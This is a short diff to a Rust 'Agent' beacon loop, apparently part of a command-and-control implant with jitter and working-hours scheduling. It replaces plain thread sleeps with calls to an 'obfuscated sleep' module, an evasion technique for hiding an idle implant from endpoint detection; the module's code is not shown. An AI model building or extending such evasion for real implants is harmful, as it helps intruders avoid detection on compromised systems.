@@ -222,8 +222,8 @@ impl Agent {
         // Calculate the sleep time using the interval and jitter
         let sleep_time = calculate_sleep_time(interval, jitter);
 
-        // Sleep the agent
-        std::thread::sleep(std::time::Duration::from_secs(sleep_time));
+        // Sleep the agent with obfuscation
+        crate::sleep_obf::obfuscated_sleep(sleep_time);
 
         // Get the working hours start time from the shared data.
         let working_start = NaiveDateTime::new(now.date(), self.shared.working_start);
@@ -252,7 +252,8 @@ impl Agent {
                 sleep_time = delta.to_std().unwrap();
             }
 
-            std::thread::sleep(sleep_time);
+            // Use obfuscated sleep for working hours wait
+            crate::sleep_obf::obfuscated_sleep_duration(sleep_time);
         }
     }
 }
